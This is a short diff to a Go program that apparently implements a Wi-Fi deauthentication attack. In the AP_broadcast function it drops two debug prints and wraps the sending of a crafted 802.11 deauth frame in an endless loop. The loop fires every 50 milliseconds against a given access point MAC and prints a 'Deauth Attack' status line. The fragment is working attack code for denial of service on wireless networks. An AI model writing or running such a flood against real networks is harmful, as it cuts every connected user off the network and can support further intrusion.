@@ -110,19 +110,19 @@ func AP_broadcast(User_interface string, Ap_mac string) {
 			fmt.Println(err)
 		}
 		tmp_uint8 := uint8(tmp_uint64)
-		fmt.Println(str)
 		tmp_mac = append(tmp_mac, tmp_uint8)
 	}
-	fmt.Println(tmp_mac)
 
 	Deauth_AP_MAC := [12]byte{tmp_mac[0], tmp_mac[1], tmp_mac[2], tmp_mac[3], tmp_mac[4], tmp_mac[5], tmp_mac[0], tmp_mac[1], tmp_mac[2], tmp_mac[3], tmp_mac[4], tmp_mac[5]}
 	binary.Write(buffer, binary.LittleEndian, Deauth_AP_MAC)
 	Deauth_Footer := [4]byte{0x50, 0x4f, 0x07, 0x00}
 	binary.Write(buffer, binary.LittleEndian, Deauth_Footer)
 	Deauth_packet := buffer.Bytes()
-
-	handle.WritePacketData(Deauth_packet)
-	time.Sleep(time.Millisecond * 50)
+	for {
+		handle.WritePacketData(Deauth_packet)
+		fmt.Println("[*] Deauth Attack (AP Broadcast) AP : ", Ap_mac, "interface : ", User_interface)
+		time.Sleep(time.Millisecond * 50)
+	}
 }
 
 func AP_unicast(User_interface string, Ap_mac string, Station_mac string) {
